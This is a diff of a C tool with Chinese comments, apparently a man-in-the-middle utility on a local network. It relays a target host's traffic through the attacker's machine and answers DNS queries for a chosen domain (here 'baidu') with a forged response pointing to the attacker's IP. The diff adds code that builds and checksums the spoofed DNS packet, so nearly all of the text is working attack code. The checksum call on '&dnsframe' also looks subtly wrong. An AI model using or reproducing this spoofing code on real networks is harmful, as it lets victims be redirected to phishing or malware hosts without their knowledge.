@@ -182,8 +182,8 @@ static void *p_send_data(void *data)
 
 int three()
 {	
-	char target_ip[20]={"192.168.1.112"};
-	char hijack_domain[20]={"taobao"};
+	char target_ip[20]={"192.168.1.107"};
+	char hijack_domain[20]={"baidu"};
     char redirect_ip[20]={"192.168.1.109"};
 
 	// printf(".......................................  ");
@@ -247,45 +247,24 @@ int three()
     u16 _dns_port;
     _ipv4 = htons(ipv4_prot);
     _dns_port = htons(dns);
-    
- //    int bufsize;
-	// int size = sizeof(bufsize);
-	// getsockopt(sock,SOL_SOCKET, SO_SNDBUF, &bufsize, &size);
-	// printf("buffsize:%d\n",bufsize);
 
     char domain[100] = {0};
+    int send_enable; /* route data ? */
     int i=0;
     int totalsize = 0;
     while(1)
     {
 		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
-//        printf("size:%d\n",recv_size);
-//        totalsize += recv_size;
-//        printf("totalsize:%.3fMB  byte:%d %s\n",
-//        		totalsize/(1024.0*1024),totalsize,domain);//(float)totalsize/(1024.0*1024.0));
+
         i++;
         bzero(domain, 100);
         ip_datagram *ip = (ip_datagram *)recv_buff;
-        
+        send_enable = 1;
         /* 收到目标主机发送至网关的数据帧 只转发ip协议数据 */
         if((ip->iphdr.srcip == dstip) && (ip->ethhdr.type == _ipv4))
         {
-            memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
-            memcpy(ip->ethhdr.src,localmac,6);
-            if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
-            {
-                perror("send error");
-            }
-        }
-        
-        /* 收到网关发送至目标主机的数据帧 */
-        if(ip->iphdr.dstip == dstip)
-        {
-        	totalsize += recv_size;
-        	// printf("totalsize:%.3fMB  byte:%d\n",
-        	// 	totalsize/(1024.0*1024),totalsize);//(float)totalsize/(1024.0*1024.0));
         	udp_datagram *udp = (udp_datagram *)recv_buff;
-            if((ip->ethhdr.type == _ipv4) && (ip->iphdr.protocol == udp_prot) && (udp->udphdr.srcport == _dns_port)) /* dns */
+            if((ip->iphdr.protocol == udp_prot) && (udp->udphdr.dstport == _dns_port)) /* dns */
 	        {
             	/* 解析主机访问的域名 */
                 dns_datagram *dnsframe = (dns_datagram *)recv_buff;
@@ -295,100 +274,137 @@ int three()
                 int length_2 = (int)*p;
                 p++;
                 memcpy(domain, p, length_2);
-                
-                /* 计算问题数用总字节数，即域名部分占用的总字节数，后面修改IP地址时需要用到 */
-                p = dnsframe->domain;
-                int question_length = 0;
-                while(*p != 0)
+                printf("%s\n", domain);
+
+                if(0 == strcmp(domain, hijack_domain)) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址，并且不会将数据报转发到网关 */
                 {
-                    question_length += 1;
-                    p++;
-                }
-                printf("%s\n",domain);
-                question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
-
-                int answernum = ntohs(dnsframe->answer_rrs); /* 服务器回答的数量 */
-
-                if(0 == strcmp(domain, hijack_domain)) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
-                {
+					/* 下面的代码用于构造假的dns响应包 */
+                    /* 修改的内容有: [1].IP层: */
+					/*              		1: total length (include IP header, udp(tcp) header,udp(tcp) data)*/
+					/*						2: header checksum(IP header 20byte)*/
+					/*						3: src ip*/
+					/*						4: dst ip*/
+					/*			    [2].传输层UDP:*/
+					/*						udp header*/
+					/*						1: src port*/
+					/*						2: dst port*/
+					/*						3: length(include UDP header, udp data)*/
+					/*						4: checksum(udp pseudo header(12 byte),udp header(8 byte),udp data)*/
+					/*						udp data, need change:*/					
+					/*						5: flags:htons(0x8400)*/
+					/*						6: answer_rrs:htons(0x0001)*/
+					/*						need add data frame(dns_answer): */
+					/*						The total size of the following data is 2+2+2+4+3+4=17byte,sizeof(dns_answer) */
+					/*						7: answer_name:htons(0xc00c) 2byte*/
+					/*						8: answer_type:htons(0x0001) 2byte*/
+					/*						9: answer_class:htons(0x0001) 2byte*/
+					/*					   10: answer_ttl:htonl(108); 4byte*/
+					/*					   11: answer_datalength:htonl(4)ipaddr size,2byte;*/
+					/*					   12: answer_ipaddr:inet_addr("xxx.xxx.xxx.xxx");answer ipaddr,4byte*/
                     
-                    
-                    /* 修改的内容有：1.服务器响应IP */
-                    /*               2.重新计算udp校验和，不然目标主机发现校验和是错误的将会丢弃该数据包*/
-                    /* 1.修改服务器响应的IP地址，改成我们自己的服务器地址， 在服务器回答的内容找到类型是*/
-                    /*   0x0001的内容，此类型里面包含了响应的IP地址*/
-                    u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
-                    while(answernum)
-                    {
-                        answernum--;
-                        dns_answer *answer = (dns_answer *)answer_c;
-                        if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改，DNS协议 */
-                        {
-                            answer->ipaddr = inet_addr(redirect_ip); 
-                        }
-                        answer_c = answer_c + 12 + ntohs(answer->datalength);
-                    }
+					/* [1]IP层: */
+					/* change total length */
+					dnsframe->iphdr.total_length = htons(recv_size - sizeof(eth_header) + sizeof(dns_answer));
 
-                    /* 计算UDP校验和，udp校验和需要包含3部分：1.udp伪首部 */
-                    /*                                        2.udp首部*/
-                    /*                                        3.udp数据部分*/
+					/* change srcip and dstip */					
+					int ip_srcip = 	dnsframe->iphdr.srcip;				
+					dnsframe->iphdr.srcip = dnsframe->iphdr.dstip;
+					dnsframe->iphdr.dstip = ip_srcip;
+
+					/* cacl checksum */					
+					dnsframe->iphdr.check_sum = 0;
+					dnsframe->iphdr.check_sum = check_sum((u16 *)&dnsframe, sizeof(ip_header));
+					
+					/* [2].传输层UDP: */
+					/* change srcport and dstport */
+					u16 srcport = dnsframe->udphdr.srcport;
+					dnsframe->udphdr.srcport = dnsframe->udphdr.dstport;
+					dnsframe->udphdr.dstport = srcport;
+					
+					/* change length(include UDP header, udp data) */				
+					dnsframe->udphdr.total_length = htons(ntohs(dnsframe->iphdr.total_length) - sizeof(ip_header));				
+		
+					/* checksum, 最后才计算校验和(数据填充完毕)*/
+					dnsframe->udphdr.check_sum = 0;					
+				
+					/* change flags:htons(0x8400) message is response, no error*/	
+					dnsframe->flags = htons(0x8400);				
+					
+					/* change answer_rrs:htons(0x0001) */
+					dnsframe->answer_rrs = htons(0x0001);
+
+					/* add dns_answer */
+					dns_answer answer;
+					answer.name = htons(0xc00c);/*1: answer_name:htons(0xc00c) 2byte*/					
+					answer.type = htons(0x0001);/*2: answer_type:htons(0x0001) 2byte*/
+					answer.class = htons(0x0001);/*3: answer_class:htons(0x0001) 2byte*/
+					answer.ttl = htonl(108);/*4: answer_ttl:htonl(108); 4byte*/
+					answer.datalength = htons(4);/*5: answer_datalength:htonl(4)ipaddr size,2byte;*/
+					answer.ipaddr = inet_addr("192.168.1.109");/*6: answer_ipaddr:inet_addr("xxx.xxx.xxx.xxx");answer ipaddr,4byte*/
+                    
+					/* 将dns_answer加到原数据报后面 */
+					memcpy(recv_buff+recv_size, &answer, sizeof(dns_answer));
+					
+					/* 计算UDP校验和，udp校验和需要包含3部分:  1.udp伪首部 */
+                    /*                                  	 2.udp首部*/
+                    /*                                  	 3.udp数据部分*/
                     /* 1.udp伪首部 */
                     udp_whdr whdr;
-                    memset(&whdr, 0x00, sizeof(whdr));
-                    whdr.srcip = ip->iphdr.srcip;
-                    whdr.dstip = ip->iphdr.dstip;
+                    whdr.srcip = dnsframe->iphdr.srcip;
+                    whdr.dstip = dnsframe->iphdr.dstip;
                     whdr.zero = 0;
-                    whdr.protocol = 0x11;
-                    whdr.length = htons(recv_size-sizeof(ip_datagram));
+                    whdr.protocol = 0x11; /* udp */
+                    whdr.length = htons(recv_size - sizeof(ip_datagram) + sizeof(dns_answer));
                     
                     /* 2.udp首部 */
-                    memcpy(&(whdr.udphdr.srcport), &(dnsframe->udphdr.srcport), sizeof(udp_header));
+                    memcpy(&whdr.udphdr, &dnsframe->udphdr, sizeof(udp_header));
                     
                     /* 3.udp数据部分 */
-                    memcpy(whdr.udpdata, &(dnsframe->transactionid), recv_size-sizeof(udp_datagram));
+                    memcpy(whdr.udpdata, &dnsframe->transactionid, recv_size - sizeof(udp_datagram) + sizeof(dns_answer));
                     
                     /* 计算之前需要将首部里面的校验和清零 */
                     whdr.udphdr.check_sum = 0;
-                    
+
                     /* 将原数据包中的检验和覆盖成新的校验和 */
                     dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
-                    recv_size-sizeof(ip_datagram) + 12); /* +12是因为有12字节的udp伪首部 */
+                    recv_size - sizeof(ip_datagram) + 12 + sizeof(dns_answer)); /* +12是因为有12字节的udp伪首部 */
 
-                    // printf("-----%d-------%s-----------\n",i,domain);
-                    // printf("dst : %02x:%02x:%02x:%02x:%02x:%02x\n",\
-                    //         dstmac[0], dstmac[1], dstmac[2],\
-                    //         dstmac[3], dstmac[4], dstmac[5]);
+					send_enable = 0;
 
+					memcpy(ip->ethhdr.dst,dstmac,6);
+				    memcpy(ip->ethhdr.src,localmac,6);
+					
+					int send_size = recv_size + sizeof(dns_answer);
 
-                    // printf("src : %02x:%02x:%02x:%02x:%02x:%02x\n",\
-                    //         localmac[0], localmac[1], \
-                    //         localmac[2], localmac[3], \
-                    //         localmac[4], localmac[5]);
-
+				    if(send_size != sendto(sock, recv_buff, send_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
+				    {
+				        printf("size:%d\n",recv_size);
+				        perror("send error");
+				    } 
             	}
             }   
+
+            if(send_enable == 1)
+            {
+	            memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
+	            memcpy(ip->ethhdr.src,localmac,6);
+	            if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
+	            {
+	                perror("send error");
+	            }
+        	}
+        }
+        
+        /* 收到网关发送至目标主机的数据帧 route*/
+        if(ip->iphdr.dstip == dstip && send_enable == 1)
+        {
             memcpy(ip->ethhdr.dst,dstmac,6);
             memcpy(ip->ethhdr.src,localmac,6);
-            
-            // if((ip->ethhdr.type == _ipv4) && (ip->iphdr.protocol == udp_prot) && (udp->udphdr.srcport == _dns_port)) 
-            // {
-            //     printf("-----%d-------%s-----------\n",i,domain);
-            //     printf("dst : %02x:%02x:%02x:%02x:%02x:%02x\n",\
-            //             dstmac[0], dstmac[1], dstmac[2],\
-            //             dstmac[3], dstmac[4], dstmac[5]);
-
-
-            //     printf("src : %02x:%02x:%02x:%02x:%02x:%02x\n",\
-            //             localmac[0], localmac[1], \
-            //             localmac[2], localmac[3], \
-            //             localmac[4], localmac[5]);
-
-            // }
             if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
             {
                 printf("size:%d\n",recv_size);
                 perror("send error");
-            } 
+            }
         }
         
     }
